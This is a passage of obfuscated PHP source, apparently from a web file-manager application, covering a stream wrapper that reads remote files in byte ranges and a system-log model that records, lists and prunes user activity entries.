self::$_cacheHeader[$¢ë“›Ë]; } $÷ÖƒÈñ‡ = isset($GLOBALS[$³Î¨ÙÏ‡[1515]]) ? $GLOBALS[$³Î¨ÙÏ‡[1515]] : !1; $GLOBALS[$³Î¨ÙÏ‡[1515]] = !0; self::$_cacheHeader[$¢ë“›Ë] = url_header($¢ë“›Ë); $GLOBALS[$³Î¨ÙÏ‡[1515]] = $÷ÖƒÈñ‡; return self::$_cacheHeader[$¢ë“›Ë]; } public function hashSimple($şö“¨Ä, $°‘«œ£² = false) { $Øéõ±…œ =& $_SERVER[ùÆÎÔ“Ñ]; $ËÎŒ¿ÊÅ = $this->info($şö“¨Ä); if (!$ËÎŒ¿ÊÅ || !$ËÎŒ¿ÊÅ[$Øéõ±…œ[201]]) { return !1; } $’ÊÔ¯¹ø = $ËÎŒ¿ÊÅ[$Øéõ±…œ[76]]; $Üá›°Ê¨ = 200; $Œ»Â˜×Ô = 50; if ($’ÊÔ¯¹ø <= $Üá›°Ê¨ * $Œ»Â˜×Ô) { return md5($this->fileSubstr($şö“¨Ä, 0, $’ÊÔ¯¹ø)) . $’ÊÔ¯¹ø; } $ € é’Ä = intval($’ÊÔ¯¹ø / $Œ»Â˜×Ô); $ˆš¦º‰ = $Øéõ±…œ[12]; $¦³ÄµÂ† = timeFloat(); $Øñˆîî¹ = 15; for ($”ºñïÉÃ = 0; $”ºñïÉÃ < $Œ»Â˜×Ô; $”ºñïÉÃ++) { if (timeFloat() - $¦³ÄµÂ† > $Øñˆîî¹) { return !1; } $ŸÏÃ™á½ = $this->fileSubstr($şö“¨Ä, $ € é’Ä * $”ºñïÉÃ, $Üá›°Ê¨); if (!$ŸÏÃ™á½) { return !1; } $ˆš¦º‰ .= $ŸÏÃ™á½; } $ˆš¦º‰ .= $this->fileSubstr($şö“¨Ä, $’ÊÔ¯¹ø - $Üá›°Ê¨, $Üá›°Ê¨); return md5($ˆš¦º‰) . $’ÊÔ¯¹ø; } public function getContent($Æç‚ŞÁ’) { return $this->fileSubstr($Æç‚ŞÁ’); } public function fileSubstr($ê¨‘Š„Ï, $ğ£«ÙÀ‡ = 0, $˜íİò· = -1) { $íô§¸ùß =& $_SERVER[ùÆÎÔ“Ñ]; $“ÙÃ«ä = $this->info($ê¨‘Š„Ï); if (!$“ÙÃ«ä || !$“ÙÃ«ä[$íô§¸ùß[201]] && $“ÙÃ«ä[$íô§¸ùß[76]] > 1024 * 1024 * 10) { return !1; } if ($˜íİò· === -1) { $˜íİò· = $“ÙÃ«ä[$íô§¸ùß[76]]; } if ($˜íİò· == 0) { return $íô§¸ùß[12]; } $“»õ‹½Å = array($íô§¸ùß[1516] . $ğ£«ÙÀ‡ . $íô§¸ùß[783] . ($ğ£«ÙÀ‡ + $˜íİò· - 1)); $æá±µ¿İ = url_request($ê¨‘Š„Ï, $íô§¸ùß[230], !1, $“»õ‹½Å, !1, !1, 30); return $æá±µ¿İ[$íô§¸ùß[1208]] ? $æá±µ¿İ[$íô§¸ùß[1208]] : $íô§¸ùß[12]; } public function download($¾•¶®¨, $®«±Ş‚Ì) { Downloader::start($¾•¶®¨, $®«±Ş‚Ì); return $®«±Ş‚Ì; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ú Òß¦·, $ïé¬×ôû = '') { $this->info = $this->info($ú Òß¦·); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ùÆÎÔ“Ñ][84]]; $this->pathOpen = $ú Òß¦·; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ú Òß¦·])) { self::$_chunkBuffer[$ú Òß¦·] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($°‚Êü£Û) { $Ç¬šÖÜø = $this->fileSubstr($this->pose, $°‚Êü£Û); $this->pose += strlen($Ç¬šÖÜø); return $Ç¬šÖÜø; } public function stream_tell() { return $this->pose; } public function stream_seek($Åª²İïÚ, $Ñ¡½‡âÒ) { $¤“«åô =& $_SERVER[ùÆÎÔ“Ñ]; if ($Ñ¡½‡âÒ == SEEK_SET) { $this->pose = $Åª²İïÚ; } else { if ($Ñ¡½‡âÒ == SEEK_CUR) { $this->pose += $Åª²İïÚ; } else { if ($Ñ¡½‡âÒ == SEEK_END) { $this->pose = $this->info[$¤“«åô[76]] + intval($Åª²İïÚ); } } } if ($Åª²İïÚ < 0) { $this->pose = $this->info[$¤“«åô[76]] + $Åª²İïÚ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ùÆÎÔ“Ñ][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($£İÙÌì, $Û¥¯ºé) { $“Àî¨Ù“ =& $_SERVER[ùÆÎÔ“Ñ]; $ã™¯£§™ = $this->info($£İÙÌì); return array($“Àî¨Ù“[1517] => 0, $“Àî¨Ù“[1518] => 0, $“Àî¨Ù“[16] => 32768 + 511, $“Àî¨Ù“[1519] => 0, $“Àî¨Ù“[1520] => 0, $“Àî¨Ù“[1521] => 0, $“Àî¨Ù“[1522] => 0, $“Àî¨Ù“[76] => $ã™¯£§™[$“Àî¨Ù“[76]], $“Àî¨Ù“[1523] => $ã™¯£§™[$“Àî¨Ù“[1391]], $“Àî¨Ù“[1479] => $ã™¯£§™[$“Àî¨Ù“[85]], $“Àî¨Ù“[1478] => $ã™¯£§™[$“Àî¨Ù“[200]], $“Àî¨Ù“[1524] => 0, $“Àî¨Ù“[1525] => 0); } static $fileInfo = array(); public function info($šæùÛºÂ) { $ÛŸßŠ­ = $_SERVER[ùÆÎÔ“Ñ][1526]; if (isset(self::$fileInfo[$šæùÛºÂ])) { return self::$fileInfo[$šæùÛºÂ]; } if (substr($šæùÛºÂ, 0, strlen($ÛŸßŠ­)) != $ÛŸßŠ­) { return !1; } self::$fileInfo[$šæùÛºÂ] = IO::info(substr($šæùÛºÂ, strlen($ÛŸßŠ­))); return self::$fileInfo[$šæùÛºÂ]; } public static function read($¯©ÏâÜ¿, $ùÈšÏ¦¨, $Éƒê¦ê) { if (!isset(self::$_fopenCache[$¯©ÏâÜ¿])) { $ç©íŒ¤¶ = new StreamWrapperIO(); $ç©íŒ¤¶->stream_open($¯©ÏâÜ¿); self::$_fopenCache[$¯©ÏâÜ¿] = $ç©íŒ¤¶; } $ç©íŒ¤¶ = self::$_fopenCache[$¯©ÏâÜ¿]; return $ç©íŒ¤¶->fileSubstr($ùÈšÏ¦¨, $Éƒê¦ê); } public static function _read($·ûñí“Ş, $©Ööµ, $È÷Ê¤) { $‰ŞÑÖ =& $_SERVER[ùÆÎÔ“Ñ]; $–ó¬…É = fopen($·ûñí“Ş, $‰ŞÑÖ[1395]); if (!$–ó¬…É) { return $‰ŞÑÖ[12]; } $„Ãà­‚ = 8192; fseek($–ó¬…É, $©Ööµ, SEEK_SET); $¤Úƒøø = $‰ŞÑÖ[12]; $óç÷©Š = 0; while ($óç÷©Š < $È÷Ê¤) { $ûÕÒºÁÀ = min($„Ãà­‚, $È÷Ê¤ - $óç÷©Š); $¤Úƒøø .= fread($–ó¬…É, $ûÕÒºÁÀ); $óç÷©Š += $ûÕÒºÁÀ; } fclose($–ó¬…É); return $¤Úƒøø; } public function fileSubstr($Û°šØŒâ, $ôÛÒóùË) { $÷ô¸á±ä =& $_SERVER[ùÆÎÔ“Ñ]; $÷×ØÉ• = $this->info[$÷ô¸á±ä[76]]; $±‡ğœé = $Û°šØŒâ; $Æú¬ˆß = $ôÛÒóùË; if ($Û°šØŒâ < 0) { $Û°šØŒâ = $÷×ØÉ• + $Û°šØŒâ; } if ($ôÛÒóùË === !1) { $ôÛÒóùË = $÷×ØÉ• - $Û°šØŒâ; } if ($Û°šØŒâ + $ôÛÒóùË > $÷×ØÉ•) { $ôÛÒóùË = $÷×ØÉ• - $Û°šØŒâ; } if ($ôÛÒóùË <= 0) { return $÷ô¸á±ä[12]; } if ($Û°šØŒâ < 0 || $Û°šØŒâ >= $÷×ØÉ• || $ôÛÒóùË <= 0 || $ôÛÒóùË > 1024 * 1024 * 10) { throw new Exception("\151\x6f\x46\x69\154\145\x52\x65\141\x64\x20\x65\162\162\157\162\x21\x20\x73\x74\141\162\164\x3d{$Û°šØŒâ}\x3b\x6c\x65\156\x67\x74\x68\x3d{$ôÛÒóùË}\73\x20\163\x69\172\145\75{$÷×ØÉ•}\73"); } $«¾™†Ú° = 64 * 1024; $¬Ú­ÁÍ =& self::$_chunkBuffer[$this->path]; if (!$¬Ú­ÁÍ) { $¬Ú­ÁÍ = array(); } $©—ùõœ = 0; $´ù™‘ş´ = 0; $ÎÓ¡•²Ì = $÷ô¸á±ä[12]; foreach ($¬Ú­ÁÍ as $©—ùõœ => $ÎÓ¡•²Ì) { $©—ùõœ = intval($©—ùõœ); $´ù™‘ş´ = $©—ùõœ + strlen($ÎÓ¡•²Ì); if ($Û°šØŒâ >= $´ù™‘ş´) { continue; } if ($Û°šØŒâ >= $©—ùõœ && $Û°šØŒâ + $ôÛÒóùË <= $´ù™‘ş´) { return substr($ÎÓ¡•²Ì, $Û°šØŒâ - $©—ùõœ, $ôÛÒóùË); } break; } if (count($¬Ú­ÁÍ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($÷ô¸á±ä[1527], $÷ô¸á±ä[1528] . count($¬Ú­ÁÍ) . "\73\163\164\x61\162\x74\x3d{$Û°šØŒâ}\54\154\145\156\x67\x74\x68\75{$ôÛÒóùË}\x3b\160\x6f\x73\145\x3a{$©—ùõœ}\x7e{$´ù™‘ş´}"); throw new Exception($÷ô¸á±ä[1529]); } $´”™é‹Ö = intval($Û°šØŒâ / $«¾™†Ú°) * $«¾™†Ú°; $öú²» = ceil(($Û°šØŒâ + $ôÛÒóùË) / $«¾™†Ú°) * $«¾™†Ú° - $´”™é‹Ö; $üôß¥€µ = IO::fileSubstr($this->path, $´”™é‹Ö, $öú²»); $¬Ú­ÁÍ[$´”™é‹Ö . $÷ô¸á±ä[12]] = $üôß¥€µ; ksort($¬Ú­ÁÍ); $ÕÄ—£øÒ = substr($üôß¥€µ, $Û°šØŒâ - $´”™é‹Ö, $ôÛÒóùË); return $ÕÄ—£øÒ; } private function log($ëé³‡ƒé, $ıå‡”») { $Ê¶Ê×€ =& $_SERVER[ùÆÎÔ“Ñ]; $¿Ìù¦…ƒ = timeFloat() - $this->timeStart; write_log(sprintf($Ê¶Ê×€[1530], $ëé³‡ƒé, $this->info[$Ê¶Ê×€[32]], $¿Ìù¦…ƒ, $ıå‡”»), $Ê¶Ê×€[1188]); } } goto dä‘ÃŒÃù; b‰ŒôÂ¿å: class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\163\164\x65\155\137\x6c\x6f\147"; protected $dataAuto = array(array("\143\x72\145\141\x74\x65\x54\151\x6d\145", "\x74\151\155\x65", "\151\x6e\163\x65\162\x74", "\x66\x75\x6e\143\164\x69\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ËƒóÁÊ’ =& $_SERVER[ùÆÎÔ“Ñ]; return array($ËƒóÁÊ’[2185] => LNG($ËƒóÁÊ’[2186]), $ËƒóÁÊ’[2187] => LNG($ËƒóÁÊ’[2188]), $ËƒóÁÊ’[1800] => LNG($ËƒóÁÊ’[2189]), $ËƒóÁÊ’[2190] => LNG($ËƒóÁÊ’[2191]), $ËƒóÁÊ’[2192] => LNG($ËƒóÁÊ’[2193]), $ËƒóÁÊ’[2194] => LNG($ËƒóÁÊ’[2195]), $ËƒóÁÊ’[2196] => LNG($ËƒóÁÊ’[2197]), $ËƒóÁÊ’[1830] => LNG($ËƒóÁÊ’[2197]), $ËƒóÁÊ’[1831] => LNG($ËƒóÁÊ’[2198]), $ËƒóÁÊ’[2199] => LNG($ËƒóÁÊ’[2200]), $ËƒóÁÊ’[2201] => LNG($ËƒóÁÊ’[2202]), $ËƒóÁÊ’[2203] => LNG($ËƒóÁÊ’[2204]), $ËƒóÁÊ’[2205] => LNG($ËƒóÁÊ’[2206]), $ËƒóÁÊ’[1828] => LNG($ËƒóÁÊ’[2207]), $ËƒóÁÊ’[2208] => LNG($ËƒóÁÊ’[2209]), $ËƒóÁÊ’[1835] => LNG($ËƒóÁÊ’[2210]), $ËƒóÁÊ’[2211] => LNG($ËƒóÁÊ’[2212]), $ËƒóÁÊ’[2213] => LNG($ËƒóÁÊ’[2214]), $ËƒóÁÊ’[2215] => LNG($ËƒóÁÊ’[2216]), $ËƒóÁÊ’[2217] => LNG($ËƒóÁÊ’[2218]), $ËƒóÁÊ’[1838] => LNG($ËƒóÁÊ’[2219]), $ËƒóÁÊ’[1839] => LNG($ËƒóÁÊ’[2220]), $ËƒóÁÊ’[2221] => LNG($ËƒóÁÊ’[2222]), $ËƒóÁÊ’[2223] => LNG($ËƒóÁÊ’[2224]), $ËƒóÁÊ’[2225] => LNG($ËƒóÁÊ’[2226]), $ËƒóÁÊ’[1833] => LNG($ËƒóÁÊ’[2227]), $ËƒóÁÊ’[2228] => LNG($ËƒóÁÊ’[2229]), $ËƒóÁÊ’[1832] => LNG($ËƒóÁÊ’[2230]), $ËƒóÁÊ’[2231] => LNG($ËƒóÁÊ’[2232]), $ËƒóÁÊ’[2233] => LNG($ËƒóÁÊ’[2234]), $ËƒóÁÊ’[2235] => LNG($ËƒóÁÊ’[2236]), $ËƒóÁÊ’[2237] => LNG($ËƒóÁÊ’[2237]), $ËƒóÁÊ’[2238] => LNG($ËƒóÁÊ’[1804]), $ËƒóÁÊ’[2239] => LNG($ËƒóÁÊ’[2240]), $ËƒóÁÊ’[2241] => LNG($ËƒóÁÊ’[2242]), $ËƒóÁÊ’[2243] => LNG($ËƒóÁÊ’[2244]), $ËƒóÁÊ’[2245] => LNG($ËƒóÁÊ’[2246]), $ËƒóÁÊ’[2247] => LNG($ËƒóÁÊ’[2248]), $ËƒóÁÊ’[2249] => LNG($ËƒóÁÊ’[2249]), $ËƒóÁÊ’[2250] => LNG($ËƒóÁÊ’[2251]), $ËƒóÁÊ’[2252] => LNG($ËƒóÁÊ’[2253]), $ËƒóÁÊ’[2254] => LNG($ËƒóÁÊ’[2255]), $ËƒóÁÊ’[2256] => LNG($ËƒóÁÊ’[2257]), $ËƒóÁÊ’[2258] => LNG($ËƒóÁÊ’[2259]), $ËƒóÁÊ’[2260] => LNG($ËƒóÁÊ’[2261])); } private function typeFile() { $¼”ŠÍ¹† =& $_SERVER[ùÆÎÔ“Ñ]; $€òÇİª = array($¼”ŠÍ¹†[1835] => array($¼”ŠÍ¹†[1836]), $¼”ŠÍ¹†[2203] => array($¼”ŠÍ¹†[2262]), $¼”ŠÍ¹†[2205] => array($¼”ŠÍ¹†[2263]), $¼”ŠÍ¹†[1828] => array($¼”ŠÍ¹†[1829]), $¼”ŠÍ¹†[2213] => array(), $¼”ŠÍ¹†[2215] => array(), $¼”ŠÍ¹†[2217] => array(), $¼”ŠÍ¹†[1838] => array($¼”ŠÍ¹†[1840]), $¼”ŠÍ¹†[1839] => array($¼”ŠÍ¹†[1840]), $¼”ŠÍ¹†[2221] => array($¼”ŠÍ¹†[2264]), $¼”ŠÍ¹†[2223] => array($¼”ŠÍ¹†[2264]), $¼”ŠÍ¹†[2225] => array($¼”ŠÍ¹†[2265]), $¼”ŠÍ¹†[2211] => array($¼”ŠÍ¹†[2266]), $¼”ŠÍ¹†[1833] => array($¼”ŠÍ¹†[2267]), $¼”ŠÍ¹†[2228] => array($¼”ŠÍ¹†[2268]), $¼”ŠÍ¹†[1832] => array($¼”ŠÍ¹†[1834])); return $€òÇİª; } private function typeAll() { $ß™ºíŒã =& $_SERVER[ùÆÎÔ“Ñ]; $ØŠ¡îè = $this->typeList; $—ù¸ßı = array_filter($this->typeFile()); foreach ($—ù¸ßı as $û¡°¨— => $ÉØÔ°öç) { $ØŠ¡îè[$ÉØÔ°öç[0]] = $ØŠ¡îè[$û¡°¨—]; } $ØŠ¡îè[$ß™ºíŒã[1840]] = LNG($ß™ºíŒã[2269]); $ØŠ¡îè[$ß™ºíŒã[2264]] = LNG($ß™ºíŒã[2270]); return $ØŠ¡îè; } public function addLog($‚ÏÙÇÑé, $Ó”ƒƒ‘Ş = array()) { $ìŞ®­Ò =& $_SERVER[ùÆÎÔ“Ñ]; if (!isset($this->typeList[$‚ÏÙÇÑé])) { return; } $Š‹å†Êë = defined($ìŞ®­Ò[475]) && USER_ID ? USER_ID : (isset($Ó”ƒƒ‘Ş[$ìŞ®­Ò[1667]]) ? $Ó”ƒƒ‘Ş[$ìŞ®­Ò[1667]] : 0); if (!$Š‹å†Êë) { $Š‹å†Êë = (int) Session::get($ìŞ®­Ò[1994]); } if ($‚ÏÙÇÑé == $ìŞ®­Ò[2239] && is_array($Ó”ƒƒ‘Ş[$ìŞ®­Ò[2271]]) && !$Ó”ƒƒ‘Ş[$ìŞ®­Ò[2271]]) { return; } $Åëîèô = get_client_ip(); if (!$Ó”ƒƒ‘Ş || strlen(json_encode($Ó”ƒƒ‘Ş)) >= 1024) { $Ó”ƒƒ‘Ş = array($ìŞ®­Ò[2272] => $Åëîèô); } else { if (is_array($Ó”ƒƒ‘Ş)) { $Ó”ƒƒ‘Ş[$ìŞ®­Ò[2272]] = $Åëîèô; } else { $Ó”ƒƒ‘Ş = array($ìŞ®­Ò[1208] => $Ó”ƒƒ‘Ş, $ìŞ®­Ò[2272] => $Åëîèô); } } $Ó”ƒƒ‘Ş = array($ìŞ®­Ò[1657] => Session::sign(), $ìŞ®­Ò[1658] => $Š‹å†Êë, $ìŞ®­Ò[33] => $‚ÏÙÇÑé, $ìŞ®­Ò[1660] => json_encode($Ó”ƒƒ‘Ş)); parent::add($Ó”ƒƒ‘Ş); } public function remove($ Ë®Ì«”) { $this->where(array($_SERVER[ùÆÎÔ“Ñ][419] => $ Ë®Ì«”))->delete(); } private function _makeOrder($±Õ³ô¶À = '') { $Ü‚©¸‚İ =& $_SERVER[ùÆÎÔ“Ñ]; $ õÅÂâ = $Ü‚©¸‚İ[200]; $¼‡øÀ§ = array($Ü‚©¸‚İ[450] => $Ü‚©¸‚İ[451], $Ü‚©¸‚İ[452] => $Ü‚©¸‚İ[453]); $ßãŒÏ¬ = Input::get($Ü‚©¸‚İ[458], $Ü‚©¸‚İ[7], $Ü‚©¸‚İ[2026], array($Ü‚©¸‚İ[1948], $Ü‚©¸‚İ[452])); $ßãŒÏ¬ = $¼‡øÀ§[$ßãŒÏ¬]; $±Õ³ô¶À = $±Õ³ô¶À . "{$ õÅÂâ}\x20{$ßãŒÏ¬}"; return $this->order($±Õ³ô¶À); } public function get($°í×†ıŞ = '') { $İøÊˆ¡ø =& $_SERVER[ùÆÎÔ“Ñ]; if (!$°í×†ıŞ) { show_json(array()); } $ÜŞùåóÒ = array(); if ($°í×†ıŞ[$İøÊˆ¡ø[1667]]) { $ÜŞùåóÒ[$İøÊˆ¡ø[1667]] = $°í×†ıŞ[$İøÊˆ¡ø[1667]]; } if (isset($°í×†ıŞ[$İøÊˆ¡ø[762]])) { $ ªıñÎ¯ = $°í×†ıŞ[$İøÊˆ¡ø[762]]; $¥îœã¬ = isset($°í×†ıŞ[$İøÊˆ¡ø[497]]) ? $°í×†ıŞ[$İøÊˆ¡ø[497]] : time(); $ÜŞùåóÒ[$İøÊˆ¡ø[200]] = array($İøÊˆ¡ø[333], array($ ªıñÎ¯, $¥îœã¬)); } if ($°í×†ıŞ[$İøÊˆ¡ø[33]]) { $­Ø®ŸüÅ = explode($İøÊˆ¡ø[50], $°í×†ıŞ[$İøÊˆ¡ø[33]]); $µº¡­É = $this->typeFile(); $Šıª‚ = array(); foreach ($­Ø®ŸüÅ as $¼§Ãë¾µ) { $Šıª‚[] = $¼§Ãë¾µ; if (isset($µº¡­É[$¼§Ãë¾µ])) { $Šıª‚ = array_merge($Šıª‚, $µº¡­É[$¼§Ãë¾µ]); } } $Šıª‚ = array_unique($Šıª‚); if ($Šıª‚) { $ÜŞùåóÒ[$İøÊˆ¡ø[33]] = array($İøÊˆ¡ø[7], $Šıª‚); } } else { $ÜŞùåóÒ[$İøÊˆ¡ø[33]] = array($İøÊˆ¡ø[2273], $İøÊˆ¡ø[2274]); } if (!empty($°í×†ıŞ[$İøÊˆ¡ø[2272]])) { $ÜŞùåóÒ[$İøÊˆ¡ø[453]] = array($İøÊˆ¡ø[383], "\45{$°í×†ıŞ[$İøÊˆ¡ø[2272]]}\45"); } $ÀÅûøí’ = $this->_makeOrder()->where($ÜŞùåóÒ)->selectPage(); if (empty($ÀÅûøí’[$İøÊˆ¡ø[369]])) { show_json(array(), !0, $ÀÅûøí’[$İøÊˆ¡ø[366]]); } $ÀÅûøí’[$İøÊˆ¡ø[369]] = $this->logList($ÀÅûøí’[$İøÊˆ¡ø[369]]); return $ÀÅûøí’; } private function ipAddress(&$¦ÇÖ¯Å) { $Ë×ö“Ÿ =& $_SERVER[ùÆÎÔ“Ñ]; if (!empty($¦ÇÖ¯Å[$Ë×ö“Ÿ[2272]])) { $­•Ñ¯— = IpLocation::get($¦ÇÖ¯Å[$Ë×ö“Ÿ[2272]]); } else { $­•Ñ¯— = LNG($Ë×ö“Ÿ[2275]); } $¦ÇÖ¯Å[$Ë×ö“Ÿ[2276]] = $­•Ñ¯—; } private function descZipDownload($àã¸©£Ï, &$ „Æ“½—) { $ºà¨Á• =& $_SERVER[ùÆÎÔ“Ñ]; if (!isset($àã¸©£Ï[$ºà¨Á•[2277]])) { return; } $¢Óç—¬é = json_decode($àã¸©£Ï[$ºà¨Á•[2277]], !0); foreach ($¢Óç—¬é as $…›ô±û—) { try { $Ø©Öµİü = IO::infoFull($…›ô±û—[$ºà¨Á•[84]]); } catch (Exception $ˆç«Ùâ) { continue; } $àã¸©£Ï[$ºà¨Á•[84]] = $…›ô±û—[$ºà¨Á•[84]]; $ „Æ“½—[] = $àã¸©£Ï[$ºà¨Á•[402]] = $Ø©Öµİü[$ºà¨Á•[402]]; $ „Æ“½—[] = $àã¸©£Ï[$ºà¨Á•[2080]] = $Ø©Öµİü[$ºà¨Á•[432]]; break; } return $àã¸©£Ï; } private function getSourceList(&$ôà«á¬) { $¡õ·ÀĞ  =& $_SERVER[ùÆÎÔ“Ñ]; $õŒºş¸Æ = array(); foreach ($ôà«á¬ as $ÑŒÒöğï => $úÚ¾ê¨È) { $Û‡¾ÕĞê = json_decode($úÚ¾ê¨È[$¡õ·ÀĞ [453]], !0); if ($úÚ¾ê¨È[$¡õ·ÀĞ [33]] == $¡õ·ÀĞ [1831]) { $Û‡¾ÕĞê = $this->descZipDownload($Û‡¾ÕĞê, $õŒºş¸Æ); $ôà«á¬[$ÑŒÒöğï][$¡õ·ÀĞ [453]] = json_encode($Û‡¾ÕĞê); continue; } if (strpos($úÚ¾ê¨È[$¡õ·ÀĞ [33]], $¡õ·ÀĞ [2082]) !== 0) { if (!isset($Û‡¾ÕĞê[$¡õ·ÀĞ [84]]) || strpos($úÚ¾ê¨È[$¡õ·ÀĞ [33]], $¡õ·ÀĞ [2278]) !== 0) { continue; } try { $àè¿¹¨  = IO::infoFull($Û‡¾ÕĞê[$¡õ·ÀĞ [84]]); } catch (Exception $Õç¸šòµ) { continue; } $õŒºş¸Æ[] = $Û‡¾ÕĞê[$¡õ·ÀĞ [402]] = $àè¿¹¨ [$¡õ·ÀĞ [402]]; $õŒºş¸Æ[] = $Û‡¾ÕĞê[$¡õ·ÀĞ [2080]] = $àè¿¹¨ [$¡õ·ÀĞ [432]]; $ôà«á¬[$ÑŒÒöğï][$¡õ·ÀĞ [453]] = json_encode($Û‡¾ÕĞê); continue; } $õŒºş¸Æ[] = $Û‡¾ÕĞê[$¡õ·ÀĞ [402]]; $õŒºş¸Æ[] = $Û‡¾ÕĞê[$¡õ·ÀĞ [2080]]; if ($Û‡¾ÕĞê[$¡õ·ÀĞ [33]] == $¡õ·ÀĞ [557]) { $õŒºş¸Æ[] = $Û‡¾ÕĞê[$¡õ·ÀĞ [453]][$¡õ·ÀĞ [1165]]; $õŒºş¸Æ[] = $Û‡¾ÕĞê[$¡õ·ÀĞ [453]][$¡õ·ÀĞ [1166]]; } if ($Û‡¾ÕĞê[$¡õ·ÀĞ [33]] == $¡õ·ÀĞ [2090]) { $õŒºş¸Æ[] = $Û‡¾ÕĞê[$¡õ·ÀĞ [453]][$¡õ·ÀĞ [402]]; } } if (!$õŒºş¸Æ) { return array(); } return Model($¡õ·ÀĞ [826])->sourceListInfo($õŒºş¸Æ, !0); } private function logList($µİË’ë˜) { $üºŒê³Ã =& $_SERVER[ùÆÎÔ“Ñ]; $…î‘Ê¹Ç = array_to_keyvalue($µİË’ë˜, $üºŒê³Ã[12], $üºŒê³Ã[1667]); $§‘¬—–­ = Model($üºŒê³Ã[535])->userListInfo(array_unique($…î‘Ê¹Ç)); $Íø¢şÈğ = $this->getSourceList($µİË’ë˜); $åŒ¥ÇÉ = $this->typeAll(); $ÏÁ°±ü = array(); $²í“—Š = array(); foreach ($µİË’ë˜ as $‚À×…Ì× => $ªÚÑŒ”«) { $¥ëïöó“ = $ªÚÑŒ”«[$üºŒê³Ã[33]]; $²ò¢ËÀï = isset($§‘¬—–­[$ªÚÑŒ”«[$üºŒê³Ã[1667]]]) ? $§‘¬—–­[$ªÚÑŒ”«[$üºŒê³Ã[1667]]] : !1; $Îşñ¯±ª = strpos($¥ëïöó“, $üºŒê³Ã[2279]) === 0 ? LNG($üºŒê³Ã[2280]) : LNG($üºŒê³Ã[2275]); $ªÚÑŒ”«[$üºŒê³Ã[32]] = isset($²ò¢ËÀï[$üºŒê³Ã[32]]) ? $²ò¢ËÀï[$üºŒê³Ã[32]] : LNG($üºŒê³Ã[2275]); $ªÚÑŒ”«[$üºŒê³Ã[542]] = isset($²ò¢ËÀï[$üºŒê³Ã[542]]) ? $²ò¢ËÀï[$üºŒê³Ã[542]] : $üºŒê³Ã[12]; $ªÚÑŒ”«[$üºŒê³Ã[1567]] = isset($åŒ¥ÇÉ[$¥ëïöó“]) ? $åŒ¥ÇÉ[$¥ëïöó“] : $Îşñ¯±ª; $ªÚÑŒ”«[$üºŒê³Ã[2025]] = $²ò¢ËÀï; $¥³†îê‚ = json_decode($ªÚÑŒ”«[$üºŒê³Ã[453]], !0); $ªÚÑŒ”«[$üºŒê³Ã[2272]] = isset($¥³†îê‚[$üºŒê³Ã[2272]]) ? $¥³†îê‚[$üºŒê³Ã[2272]] : $üºŒê³Ã[12]; $ªÚÑŒ”«[$üºŒê³Ã[2276]] = IpLocation::get($ªÚÑŒ”«[$üºŒê³Ã[2272]]); if (strpos($¥ëïöó“, $üºŒê³Ã[2082]) === 0 || isset($¥³†îê‚[$üºŒê³Ã[2080]])) { $¥³†îê‚[$üºŒê³Ã[86]] = $Íø¢şÈğ[$¥³†îê‚[$üºŒê³Ã[402]]]; $¥³†îê‚[$üºŒê³Ã[2095]] = $Íø¢şÈğ[$¥³†îê‚[$üºŒê³Ã[2080]]]; if ($¥³†îê‚[$üºŒê³Ã[33]] == $üºŒê³Ã[557]) { $¥³†îê‚[$üºŒê³Ã[453]][$üºŒê³Ã[1165]] = $Íø¢şÈğ[$¥³†îê‚[$üºŒê³Ã[453]][$üºŒê³Ã[1165]]]; $¥³†îê‚[$üºŒê³Ã[453]][$üºŒê³Ã[1166]] = $Íø¢şÈğ[$¥³†îê‚[$üºŒê³Ã[453]][$üºŒê³Ã[1166]]]; } if ($¥³†îê‚[$üºŒê³Ã[33]] == $üºŒê³Ã[2090]) { $¥³†îê‚[$üºŒê³Ã[453]][$üºŒê³Ã[402]] = $Íø¢şÈğ[$¥³†îê‚[$üºŒê³Ã[453]][$üºŒê³Ã[402]]]; } if ($¥³†îê‚[$üºŒê³Ã[33]] == $üºŒê³Ã[1826]) { $¥³†îê‚[$üºŒê³Ã[2095]] = $¥³†îê‚[$üºŒê³Ã[86]]; $¥³†îê‚[$üºŒê³Ã[2080]] = $¥³†îê‚[$üºŒê³Ã[2095]][$üºŒê³Ã[402]]; $¥³†îê‚[$üºŒê³Ã[86]] = !1; $¥³†îê‚[$üºŒê³Ã[402]] = $üºŒê³Ã[12]; } if ($¥³†îê‚[$üºŒê³Ã[86]] && $¥³†îê‚[$üºŒê³Ã[86]][$üºŒê³Ã[411]] == $üºŒê³Ã[1290]) { $²í“—Š[] = $ªÚÑŒ”«[$üºŒê³Ã[399]]; unset($µİË’ë˜[$‚À×…Ì×]); continue; } if ($¥³†îê‚[$üºŒê³Ã[2095]] && $¥³†îê‚[$üºŒê³Ã[2095]][$üºŒê³Ã[411]] == $üºŒê³Ã[1290]) { $²í“—Š[] = $ªÚÑŒ”«[$üºŒê³Ã[399]]; unset($µİË’ë˜[$‚À×…Ì×]); continue; } } $ªÚÑŒ”«[$üºŒê³Ã[453]] = $¥³†îê‚; unset($ªÚÑŒ”«[$üºŒê³Ã[2281]]); $ÏÁ°±ü[] = $ªÚÑŒ”«; } $this->clearSystemPathLog($²í“—Š); return $ÏÁ°±ü; } private function clearSystemPathLog($û¬ ÛÛ”) { $ƒÄ•ÓÒÙ =& $_SERVER[ùÆÎÔ“Ñ]; if (count($û¬ ÛÛ”) == 0) { return; } $­®‰ËÔ– = array($ƒÄ•ÓÒÙ[399] => array($ƒÄ•ÓÒÙ[7], array_unique($û¬ ÛÛ”))); $this->where($­®‰ËÔ–)->delete(); } public function deviceList($°®±à˜Ú, $ÆÖé´€ã = 0) { $¶Æù„Â =& $_SERVER[ùÆÎÔ“Ñ]; $—ÔóË±¥ = array($¶Æù„Â[1667] => $°®±à˜Ú, $¶Æù„Â[200] => 